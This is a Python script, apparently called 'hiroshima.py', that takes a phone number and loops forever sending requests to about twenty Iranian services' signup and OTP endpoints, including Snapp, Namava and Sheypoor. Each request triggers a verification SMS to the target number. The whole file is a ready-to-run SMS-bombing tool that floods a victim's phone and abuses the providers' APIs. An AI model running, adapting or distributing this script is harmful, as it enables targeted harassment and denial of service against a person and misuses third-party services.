import sys
import requests

import colorama
colorama.init()

banner = f"""{colorama.Fore.YELLOW}
▒█░▒█ ░▀░ █▀▀█ █▀▀█ █▀▀ █░░█ ░▀░ █▀▄▀█ █▀▀█
▒█▀▀█ ▀█▀ █▄▄▀ █░░█ ▀▀█ █▀▀█ ▀█▀ █░▀░█ █▄▄█
▒█░▒█ ▀▀▀ ▀░▀▀ ▀▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░░▀ ▀░░▀

Coded by Tganga36
"""

if not len(sys.argv) >= 2:
    print("Usage: python3 hiroshima.py +989123456789")
    sys.exit(0)

phone = sys.argv[1]
connection_data = {
    "namava": {
        "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        "protocol": "post",
        "headers": {
            "Host": "www.namava.ir",
            "Content-Length": "28",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://www.namava.ir/auth/register-phone",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"UserName": phone},
    },
    "espard": {
        "url": "https://app.espard.com/api/v1/auth/identify-by-mobile",
        "protocol": "post",
        "headers": {
            "Host": "app.espard.com",
            "Content-Length": "232",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fa",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://join.espard.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {
            "data": {"mobile": phone},
            "oneSignalPlayerId": "",
            "appVersion": "999",
            "deviceId": "REGISTER_PRO",
            "deviceInfo": "x86_64",
            "deviceToken": "",
            "clientId": "com.espard.pro",
            "platform": "3rd",
            "osVersion": "",
            "timeZone": "GMT+3:30",
            "time": "",
        },
    },
    "itoll": {
        "url": "https://app.itoll.ir/api/v1/auth/login",
        "protocol": "post",
        "headers": {
            "Host": "app.itoll.ir",
            "Content-Length": "24",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fa",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://itoll.ir/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"mobile": phone},
    },
    "anten": {
        "url": "https://api2.anten.ir/users",
        "protocol": "post",
        "headers": {
            "Host": "api2.anten.ir",
            "Content-Length": "23",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://www.anten.ir/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"phone": phone},
    },
    "tap33": {
        "url": "https://tap33.me/api/v2/user",
        "protocol": "post",
        "headers": {
            "Host": "tap33.me",
            "Content-Length": "60",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Referer": "https://join.tapsi.ir/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"credential": {"phoneNumber": phone, "role": "DRIVER"}},
    },
    "taaghche": {
        "url": "https://gw.taaghche.com/v4/site/auth/signup",
        "protocol": "post",
        "headers": {
            "Host": "gw.taaghche.com",
            "Content-Length": "25",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Referer": "https://taaghche.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"contact": phone},
    },
    "pezeshket": {
        "url": "https://api.pezeshket.com/core/v1/auth/requestCode",
        "protocol": "post",
        "headers": {
            "Host": "api.pezeshket.com",
            "Content-Length": "30",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "fa-IR, en;q=0.8, *;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://web.pezeshket.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"mobileNumber": phone},
    },
    "shabtravel": {
        "url": "https://www.shab.travel/api/fa/sandbox/v_1_4/auth/enter-mobile",
        "protocol": "post",
        "headers": {
            "Host": "www.shab.travel",
            "Content-Length": "45",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Referer": "https://www.shab.travel/login",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"mobile": phone, "country_code": "+98"},
    },
    "snapp": {
        "url": "https://api.snapp.ir/api/v1/sms/link",
        "protocol": "post",
        "headers": {
            "Host": "api.snapp.ir",
            "Content-Length": "23",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Referer": "https://snapp.ir/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"phone": phone},
    },
    "sheypoor": {
        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
        "protocol": "post",
        "headers": {
            "Host": "www.sheypoor.com",
            "Content-Length": "26",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://www.sheypoor.com/session",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"username": phone},
    },
    "behtarino": {
        "url": "https://api.behtarino.com/api/v1/businesses/mqdbicdbmb/vitrin_verification/",
        "protocol": "post",
        "headers": {
            "Host": "api.behtarino.com",
            "Content-Length": "23",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://marysbakery.ir/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"phone": phone},
    },
    "pinket": {
        "url": "https://pinket.com/api/cu/v2/phone-verification",
        "protocol": "post",
        "headers": {
            "Host": "pinket.com",
            "Content-Length": "29",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=UTF-8",
            "Referer": "https://pinket.com/auth/phoneNumber",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"phoneNumber": phone},
    },
    "timcheh": {
        "url": "https://api.timcheh.com/auth/otp/send",
        "protocol": "post",
        "headers": {
            "Host": "api.timcheh.com",
            "Content-Length": "24",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://timcheh.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"mobile": phone},
    },
    "darmankadeh": {
        "url": "https://base.darmankade.com/v1/PatientLogin",
        "protocol": "post",
        "headers": {
            "Host": "base.darmankade.com",
            "Content-Length": "24",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Content-Type": "application/json;charset=utf-8",
            "Referer": "https://www.darmankade.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        },
        "data": {"mobile": phone},
    },
    "mrbilit": {
        "url": f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={phone}&source=2&sendTokenIfNot=true",
        "protocol": "get",
        "headers": {},
        "data": {},
    },
    "azki": {
        "url": f"https://www.azki.app/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%22azki_{phone}%22%7D",
        "protocol": "get",
        "headers": {},
        "data": {},
    },
    "snappmarket": {
        "url": f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phone}",
        "protocol": "get",
        "headers": {},
        "data": {},
    },
    "gap": {
        "url": f"https://core.gap.im/v1/user/add.json?mobile={phone}",
        "protocol": "get",
        "headers": {},
        "data": {},
    },
    "filmnet": {
        "url": f"https://filmnet.ir/api-v2/access-token/users/{phone}/otp",
        "protocol": "get",
        "headers": {},
        "data": {},
    },
    "snappdoctor": {
        "url": f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone}/sms?cCode=%2098",
        "protocol": "get",
        "headers": {},
        "data": {},
    },
}
print(f"{colorama.Fore.LIGHTGREEN_EX}[!]{colorama.Fore.LIGHTWHITE_EX} Sending...")
while True:
    for _,v in connection_data.items():
        if v["protocol"] == "post":
            requests.post(v["url"], headers=v["headers"], data=v["data"])
        else:
            requests.get(v["url"], headers=v["headers"], data=v["data"])
